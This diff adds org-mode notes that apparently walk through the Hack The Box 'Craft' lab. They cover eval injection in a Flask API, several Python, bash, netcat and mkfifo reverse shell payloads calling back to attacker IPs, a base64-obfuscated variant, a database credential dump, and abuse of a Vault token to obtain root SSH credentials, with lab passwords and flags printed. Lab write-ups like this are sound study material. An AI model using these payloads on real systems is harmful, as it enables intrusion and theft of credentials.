@@ -1,0 +1,446 @@
+==
+tags: #linux
+
+==
+
+* nmap
+  #+begin_src bat
+  sudo nmap -sV -sC -oA nmap/vip.basic 10.129.4.57
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
+|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
+|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
+443/tcp open  ssl/http nginx 1.15.8
+|_http-title: About
+|_http-server-header: nginx/1.15.8
+| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
+| Not valid before: 2019-02-06T02:25:47
+|_Not valid after:  2020-06-20T02:25:47
+| tls-nextprotoneg: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  #+end_src
+** full scan
+   #+begin_src bat
+   sudo nmap  -p- -A -T4 -oA nmap/vip.full 10.129.4.57
+
+PORT      STATE    SERVICE    VERSION
+22/tcp    open     ssh        OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
+|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
+|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
+393/tcp   filtered dis
+443/tcp   open     ssl/http   nginx 1.15.8
+|_http-server-header: nginx/1.15.8
+|_ssl-date: TLS randomness does not represent time
+|_http-title: About
+| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
+| Not valid before: 2019-02-06T02:25:47
+|_Not valid after:  2020-06-20T02:25:47
+| tls-nextprotoneg:
+|_http/1.1
+|_tls-alpn:
+3665/tcp  filtered ent-engine
+3915/tcp  filtered agcat
+6022/tcp  open     ssh        Golang x/crypto/ssh server (protocol 2.0)
+| ssh-hostkey:
+|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)   
+   #+end_src
+* nginx
+  visiting the site using =https=, we come across a couple of other subdomains that we add to
+  our hosts file
+  #+begin_src 
+  10.129.4.57     craft.htb api.craft.htb gogs.craft.htb
+  #+end_src
+* api.craft.htb
+  contains a swagger page
+* git repo
+  going through the commit history we find a test file where valid creds are used:
+  #+begin_src python
+  response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
+
+  json_response = json.loads(response.text)
+  token =  json_response['token']
+  #+end_src
+  we can use this to get a valid token
+* dinesh's fix
+  in file
+  #+begin_src 
+  craft_api/api/brew/endpoints/brew.py
+  #+end_src
+  we can find the following changes made in a commit:
+  #+begin_src python
+  @@ -38,9 +38,13 @@ class BrewCollection(Resource):
+
+  """
+
+  Creates a new brew entry.
+
+  """
+-   create_brew(request.json)
+
+-   return None, 201
++
++   # make sure the ABV value is sane.
++   if eval('%s > 1' % request.json['abv']):
++       return "ABV must be a decimal value less than 1.0", 400
++   else:
++       create_brew(request.json)
++       return None, 201
+  #+end_src
+  we can use the token and the try and send a reverse shell via the json data
+  #+begin_src python
+  'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+  #+end_src
+* python rev shell payload
+  #+begin_src 
+  'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.10',4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh"))}'
+  #+end_src
+* exploiting eval
+  ending the input with a =#= will result in the following => 1= part of the eval code being
+  treated as a comment
+  #+begin_src python
+  >>> eval('print("hi")# > 1')
+hi
+  #+end_src
+  so, let's try doing this with the revshell payload
+  #+begin_src python
+  'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.10',4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh"))}#'
+  #+end_src
+* ping
+  let's set up an icmp listener:
+  #+begin_src bat
+  sudo tcpdump -i lo icmp
+  #+end_src
+  and try this payload
+  #+begin_src bat
+  payload = '__import__("subprocess").run(["ping","-c","1","10.10.14.10"])#'
+  #+end_src
+  this works and we get a hit.
+  #+begin_src bat
+  $ sudo tcpdump -i tun0 icmp
+
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+12:43:08.636171 IP craft.htb > 10.10.14.10: ICMP echo request, id 16384, seq 0, length 64
+12:43:08.636227 IP 10.10.14.10 > craft.htb: ICMP echo reply, id 16384, seq 0, length 64
+  #+end_src
+* reverse shell
+  let's modify the payload
+  #+begin_src bat
+'__import__("socket,os,pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.10',4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh"))}#'
+  #+end_src
+  #+begin_src bat
+'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")#'
+  #+end_src
+  #+begin_src bat
+'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])#'
+  #+end_src
+ #+begin_src bat
+'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())#'
+ #+end_src
+** use bash
+  #+begin_src 
+  payload = '__import__("subprocess").run(["bash","-i",">&","/dev/tcp/10.10.14.10/4242", "0>&1"])#'
+  #+end_src
+** working payload
+   #+begin_src bat
+   payload = '__import__("os").system("nc 10.10.14.10 4242")#'
+
+connect to [10.10.14.10] from (UNKNOWN) [10.129.7.209] 42233
+   #+end_src
+   ok, we do get a hit but it immediately closes.
+   we can also pipe and do an echo:
+   #+begin_src bat
+   payload = '__import__("os").system("echo hi | nc 10.10.14.10 4242")#'
+
+connect to [10.10.14.10] from (UNKNOWN) [10.129.7.209] 39697
+hi
+   #+end_src
+** anatomy of the working reverse shell payload
+   all of this is from chatgpt btw:
+   #+begin_src bat
+   __import__("os").system("SHELL COMMAND")
+   #+end_src
+   so:
+   #+begin_src bat
+   __import__("os").system("bash -i >& /dev/tcp/10.10.14.10/4242 0>&1")
+   #+end_src
+   this doesn't work, so possibly the shell is not bash; let's confirm:
+   #+begin_src bat
+   payload = '__import__("os").system("ls -l /bin/sh | nc 10.10.14.10 4242")#'
+
+lrwxrwxrwx    1 root     root            12 Jan 30  2019 /bin/sh -> /bin/busybox
+   #+end_src
+   =whoami= returns =root=; however, trying to read the contents of the =/root= directory reveals
+   there's nothing there; same for =/home=; meaning this is a restricted shell and we might have
+   to break out of it.
+** /etc/passwd
+   #+begin_src
+   root:x:0:0:root:/root:/bin/ash
+   bin:x:1:1:bin:/bin:/sbin/nologin
+   daemon:x:2:2:daemon:/sbin:/sbin/nologin
+   adm:x:3:4:adm:/var/adm:/sbin/nologin
+   lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+   sync:x:5:0:sync:/sbin:/bin/sync
+   shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+   halt:x:7:0:halt:/sbin:/sbin/halt
+   mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+   news:x:9:13:news:/usr/lib/news:/sbin/nologin
+   uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+   operator:x:11:0:operator:/root:/bin/sh
+   man:x:13:15:man:/usr/man:/sbin/nologin
+   postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
+   cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+   ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+   sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+   at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+   squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+   xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+   games:x:35:35:games:/usr/games:/sbin/nologin
+   postgres:x:70:70::/var/lib/postgresql:/bin/sh
+   cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+   vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+   ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+   smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+   guest:x:405:100:guest:/dev/null:/sbin/nologin
+   nobody:x:65534:65534:nobody:/:/sbin/nologin
+   #+end_src
+** break out of busybox
+   try and call =bash= from within busybox and run a command like so
+   #+begin_src bat
+   # payload = '__import__("os").system("/bin/bash -c \'id\' | nc 10.10.14.26 4242")#'
+   #+end_src
+   this doesn't work
+** working payload from the official solution
+   #+begin_src 
+   "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 4444 >/tmp/f')"
+   #+end_src
+** listen with rlwrap and nc
+   #+begin_src 
+   rlwrap nc -lvnp 4444
+   #+end_src
+** settings file
+   inside the /settings.py/ file, we find the db creds; however, mysql command does not exist,
+   and it looks like the db is not located on the same server
+   #+begin_src bat
+/opt/app # cat craft_api/settings.py
+
+# Flask settings
+FLASK_SERVER_NAME = 'api.craft.htb'
+FLASK_DEBUG = False  # Do not use debug mode in production
+# Flask-Restplus settings
+RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
+RESTPLUS_VALIDATE = True
+RESTPLUS_MASK_SWAGGER = False
+RESTPLUS_ERROR_404_HELP = False
+CRAFT_API_SECRET = 'hz66OCkDtv8G6D'
+# database
+MYSQL_DATABASE_USER = 'craft'
+MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
+MYSQL_DATABASE_DB = 'craft'
+MYSQL_DATABASE_HOST = 'db'
+SQLALCHEMY_TRACK_MODIFICATIONS = False
+   #+end_src
+   here are the contents of the /dbtest.py/ file.
+   #+begin_src python
+#!/usr/bin/env python
+
+import pymysql
+from craft_api import settings
+# test connection to mysql database
+connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
+                             user=settings.MYSQL_DATABASE_USER,
+                             password=settings.MYSQL_DATABASE_PASSWORD,
+                             db=settings.MYSQL_DATABASE_DB, 
+                             cursorclass=pymysql.cursors.DictCursor)
+                                                           
+try: 
+    with connection.cursor() as cursor:                                                                               
+        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
+        cursor.execute(sql)
+        result = cursor.fetchone()
+        print(result)
+
+finally:                      
+    connection.close()
+   #+end_src
+   let's just change the sql here to read all the data from the =user= table:
+   #+begin_src python
+   sql = "SELECT * FROM `user`"
+   #+end_src
+   there was no way to edit it easily on the target, so I uploaded it via a python server;
+   running this, we get back all the passwords in plain text:
+   #+begin_src bat
+   /opt/app # python read-db.py
+
+[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
+   #+end_src
+** try and ssh
+   none of these work, so let's see if there's somewhere else we can log in
+** gogs.craft.htb
+   this is the git repo and we're able to log in as gilfoyle and find his =id_rsa=
+* user.txt
+  ssh as gilfoyle and find the flag:
+  #+begin_src
+  7d3dd1c7561ef17802c992d3dcfaa4a2
+  #+end_src
+* priv esc
+** check env vars
+   #+begin_src bat
+   gilfoyle@craft:~$ env
+
+SSH_CONNECTION=10.10.14.26 44106 10.129.2.238 22
+LANG=en_US.UTF-8
+XDG_SESSION_ID=230
+USER=gilfoyle
+PWD=/home/gilfoyle
+HOME=/home/gilfoyle
+SSH_CLIENT=10.10.14.26 44106 22
+SSH_TTY=/dev/pts/0
+MAIL=/var/mail/gilfoyle
+TERM=tmux-256color
+SHELL=/bin/bash
+VAULT_ADDR=https://vault.craft.htb:8200/
+SHLVL=1
+LOGNAME=gilfoyle
+XDG_RUNTIME_DIR=/run/user/1001
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+_=/usr/bin/env
+   #+end_src
+** vault.craft.htb
+   this results in a page not found; =8200= is not reachable; but surely this is important
+** sudo -l
+   #+begin_src 
+   sudo: command not found
+   #+end_src
+** linpeas
+   #+begin_src bat
+   ./linpeas.sh -a > ./linpeas.txt
+   #+end_src
+** polkit binary
+   the linpeas output shows =pkexec= has the suid bit set
+   #+begin_src bat
+   pkexec -u root id
+
+Authentication is needed to run `/usr/bin/id' as the super user
+   #+end_src
+   it asks for password;
+** polkit exploit
+   try the [[file:d:/code/htb/academy/modules/linux-privilege-escalation/polkit.org::*overview][polkit exploit]], but =gcc= is not present
+* vault
+  ok, turns out the path is with vault; and i was able to just use chatgpt to do the rest of
+  this box. the below is from the chat:
+  #+begin_src 
+  Vault-SSH refers to the SSH secrets engine of HashiCorp Vault. It’s a feature that lets
+  Vault control and issue SSH access dynamically, instead of relying on long-lived SSH keys
+  stored on servers.
+  Vault becomes the authority that grants temporary SSH access to machines.
+  #+end_src
+** The problem Vault-SSH solves
+   Traditional SSH setups often look like this:
+   developer laptop
+   |
+   private key (stored locally)
+   |
+   target server authorized_keys
+*** Problems with this model
+    - keys live forever unless manually rotated
+    - revoking access is difficult
+    - keys get copied around
+* exploit      
+  we have a =.vault-token= file on the home directory
+  #+begin_src bat
+  cat .vault-token f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+  #+end_src
+  chatgpt suggests trying this endpoint
+  #+begin_src bash
+  curl -k https://vault.craft.htb:8200/v1/sys/health
+
+{"initialized":true,"sealed":false,"standby":false,"performance_standby":false,"replication_performance_mode":"disabled","replication_dr_mode":"disabled","server_time_utc":1773226807,"version":"0.11.1","cluster_name":"vault-cluster-cb7e66f9","cluster_id":"8bb98351-0148-3c42-d124-45a87dc43db7"}
+  #+end_src
+  So the Vault is *unsealed* and *active*, which means the API is fully usable.
+** find secrets engines
+   #+begin_src bat
+   curl -sk -H "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" https://vault.craft.htb:8200/v1/sys/mounts
+   #+end_src
+   reveals, among others:
+   #+begin_src 
+   secret/   (kv v1)
+   ssh/      (ssh secrets engine)
+   #+end_src
+** Enumerate ssh roles
+   #+begin_src bash
+   $ curl -sk -H "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" https://vault.craft.htb:8200/v1/ssh/roles?list=true
+
+{"request_id":"7b23eea2-cd33-9dce-6b4b-ad67104eb5fe","lease_id":"","renewable":false,"lease_duration":0,"data":{"key_info":{"root_otp":{"key_type":"otp"}},"keys":["root_otp"]},"wrap_info":null,"warnings":null,"auth":null}               
+   #+end_src
+** generate root creds
+   #+begin_src bash
+   $ curl -sk -H "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" -d '{"ip":"127.0.0.1"}'
+https://vault.craft.htb:8200/v1/ssh/creds/root_otp
+
+{"request_id":"d2a73402-1cc2-36ff-ba7d-bf6b5dde090c","lease_id":"ssh/creds/root_otp/19f9d6c1-f393-0d6b-9475-b0e2ac70f54a","renewable":false,"lease_duration":2764800,"data":{"ip":"127.0.0.1","key":"81f8b9bd-26e9-37b0-991a-8bdeb1a7343b","
+key_type":"otp","port":22,"username":"root"},"wrap_info":null,"warnings":null,"auth":null}
+   #+end_src
+   then use this key as root password and login
+** flag
+   #+begin_src 
+   $ cat root.txt
+
+77cb9c92972dfd04e63548654e079065
+   #+end_src
+* ippsec
+** gitleaks and trufflehog
+   uses these tools to scan the repo
+** clone repo and check diff for each commit 
+** Port 6022
+   ok this is the SSH server for gogs.
+   try logging in as dinesh to this server
+   #+begin_src bat
+   ssh dinesh@10.129.4.57 -p 6022
+   #+end_src
+   requires a key file
+** the payload
+   base64 encrypts a regular python reverse shell payload after getting rid of all the spaces.
+   #+begin_src bat
+   payload = 'exec(__import__("base64").b64decode(<b64payload>))'
+   #+end_src
+   the b64payload is generated like this:
+   #+begin_src bat
+   from base64 import b64encode
+   sc = """__import__("socket,os,pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.10',4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")"""
+   print(b64encode(sc.encode()))
+   #+end_src
+   this generates a base64 string; which is the =<b64payload>= in the code block
+** upgrade the shell
+   #+begin_src bat
+   python -c 'import pty;pty.spawn("/bin/sh")'
+   #+end_src
+   then press =Ctrl-z=; then type:
+   #+begin_src bat
+   stty raw -echo
+   #+end_src
+   then =fg=
+   we just used =rlwrap=; not sure which is better.
+** vi issue fix
+   we were unable to work with vi on the shell; turns out the solution is to fix the rows/cols
+   on the stty session to match with the terminal.
+   #+begin_src bat
+   stty -a
+
+speed 38400 baud; rows 50; columns 117; line = 0;
+   #+end_src
+   returns the rows and columns of the terminal; now then inside the reverse shell session,
+   #+begin_src 
+   stty rows 50 cols 117
+   #+end_src
+   now vi will work.
+** hashcat to crack flask app secret
+   use mode =16500= (for jwt) to crack the =CRAFT_API_SECRET= from =settings.py=
